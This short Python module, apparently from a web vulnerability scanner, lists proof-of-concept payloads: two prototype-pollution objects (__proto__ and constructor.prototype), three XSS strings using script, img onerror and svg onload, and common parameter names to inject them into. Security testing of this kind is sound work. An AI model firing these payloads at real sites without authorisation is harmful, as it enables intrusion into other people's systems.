"""
Payloads for the Quick PoC mode.
"""

QUICK_POC_PAYLOADS = [
    {"__proto__": {"ppmap_poc": "confirmed"}},
    {"constructor": {"prototype": {"ppmap_poc": "confirmed"}}},
]

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
]

DEFAULT_XSS_PARAMS = ["q", "search", "query", "id", "name"]
